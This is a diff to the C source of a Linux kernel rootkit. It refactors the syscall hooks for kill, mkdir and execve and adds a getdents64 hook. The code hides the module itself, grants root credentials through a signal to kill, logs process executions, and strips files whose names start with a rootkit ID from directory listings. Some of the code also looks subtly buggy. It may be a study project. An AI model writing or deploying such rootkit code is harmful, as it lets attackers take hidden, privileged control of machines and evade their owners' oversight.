@@ -1,15 +1,13 @@
 /*
 file for the all of the hooked functions and other relevant code
 */
+#include "hooked_syscalls.h"
 
 extern int BUFFER_SIZE; //size of buffers used
 
 	/*=========================================*\
 		generic functions to be used by hooks
 	\*=========================================*/
-
-bool module_hidden = false; //variable to see if the module is hidden
-static struct list_head *prev_module; //location of the previous module
 
 static int hide_rootkit(void){ //function to unhide\hide the rootkit
 	if (!module_hidden){ //module is not hidden
@@ -42,11 +40,9 @@ static int set_root(void){ //changes credentials
 	return 0; //returns 0 for no error
 }
 
-	/*==============*\
-		hooked kill
-	\*==============*/
-ptregs_t orig_kill = (ptregs_t) 0; //address of the kill syscall from the syscall table
-
+	/*===================*\
+		hooked syscalls
+	\*===================*/
 
 static asmlinkage long hooked_kill(const struct pt_regs *regs){ //hook function
 	char buffer[BUFFER_SIZE]; //buffer for sprintf
@@ -59,15 +55,10 @@ static asmlinkage long hooked_kill(const struct pt_regs *regs){ //hook function
 		hide_rootkit();
 	}
 	client_print(buffer); //sends message
-	return orig_kill(regs); //kills process and returns result
+	return sys_kill.orig_syscall(regs); //kills process and returns result
 }
-struct hook_t sys_kill = {.hooked_syscall = hooked_kill, .syscall_number = __NR_kill}; //the hook_t struct for use within module
 
 
-	/*================*\
-		hooked mkdir
-	\*================*/
-ptregs_t orig_mkdir = (ptregs_t) 0; //address of the mkdir syscall from the syscall table
 static asmlinkage long hooked_mkdir(const struct pt_regs *regs){ //hook function
 	char buffer[BUFFER_SIZE]; //buffer for sprintf
 	char dir_name[NAME_MAX] = {0}; //buffer for directory name
@@ -82,16 +73,11 @@ static asmlinkage long hooked_mkdir(const struct pt_regs *regs){ //hook function
 		sprintf(buffer, "[mkdir] directory = ??? (unable to be copied)    mode = 0x%x\n", dir_name, mode); //copy message to buffer
 	}
 	client_print(buffer); //sends message
-	return orig_mkdir(regs); //executes original syscall
+	return sys_mkdir.orig_syscall(regs); //executes original syscall
 }
-struct hook_t sys_mkdir = {.hooked_syscall = hooked_mkdir, .syscall_number = __NR_mkdir}; //the hook_t struct for use within module
 
 
-	/*====================*\
-		hooked execve
-	\*====================*/
-ptregs_t orig_execve = (ptregs_t) 0; //address of the execve syscall from the syscall table
-static asmlinkage long hooked_execve(const struct pt_regs *regs){ //hook functions
+static asmlinkage long hooked_execve(const struct pt_regs *regs){ //hook function
 	char buffer[BUFFER_SIZE]; //buffer for sprintf
 	char filename[NAME_MAX] = {0}; //buffer for filename
 	char __user *filename_user = (char *)regs->di; //gets userspace filename
@@ -104,6 +90,55 @@ static asmlinkage long hooked_execve(const struct pt_regs *regs){ //hook functio
 		sprintf(buffer, "[execve] ??? (unable to be copied)  errcode = %i\n", error); //copy message to buffer
 	}
 	client_print(buffer); //sends message
-	return orig_execve(regs); //executes original syscall
+	return sys_execve.orig_syscall(regs); //executes original syscall
 }
-struct hook_t sys_execve = {.hooked_syscall = hooked_execve, .syscall_number = __NR_execve}; //the hook_t struct for use within module
+
+
+static asmlinkage long hooked_getdents64(const struct pt_regs *regs){ //hook function
+	char buffer[BUFFER_SIZE]; //buffer for sprintf
+	struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL; //buffer to hold kernelspace dirent
+	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si; //gets the userspace dirent structure from regs
+	int ret = sys_getdents64.orig_syscall(regs); //gets the directory listing from  originalgetdents64
+	unsigned long offset = 0; //offset for loop
+	dirent_ker = kzalloc(ret, GFP_KERNEL); //allocates memory and zeroes out for kernelspace dirent
+
+	if (ret <= 0 || dirent_ker==NULL){ //if neither above failed
+        return ret; //return original syscall result
+	}
+	int err;
+    err = copy_from_user(dirent_ker, dirent, ret); //copy dirent from userspace in dirent_ker
+    if(err){ //if error copying from userspace
+		kfree(dirent_ker); //free buffer
+	    return ret; //return original result
+	}
+
+	while(offset<ret){ //loops through all of the directies
+		//hides all files/directories beginning with rootkit_id
+        current_dir = (void *)dirent_ker + offset; //goes to next directory
+
+        if ( memcmp(ROOTKIT_ID, current_dir->d_name, strlen(ROOTKIT_ID)) == 0){ //Compare the first bytes of current_dir->d_name to rootkit id
+			sprintf(buffer,"[rootkit] getdents64- hiding %s\n", current_dir->d_name);
+			client_print(buffer);
+			
+			if (current_dir==dirent_ker){ //if special case where fisrt entry needs to be hidden
+				ret -= current_dir->d_reclen; //decrements ret
+				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret); //shifts all structs up in memory
+                continue;
+
+			}
+			previous_dir->d_reclen += current_dir->d_reclen; //hide entry by incrimenting length of previous entry, "swallowing" the entry
+        }
+		else{ //if don't need to hide it
+			previous_dir = current_dir; //sets previous directory entry
+		}
+        offset += current_dir->d_reclen; //incriment offset by length of current_dir
+	}
+
+    err = copy_to_user(dirent, dirent_ker, ret); //Copy dirent_ker back to userspace from dirent_ker
+    if(err){ //if error copying back to userspace
+		kfree(dirent_ker);
+		return ret;
+	}
+	kfree(dirent_ker);
+	return ret;
+}
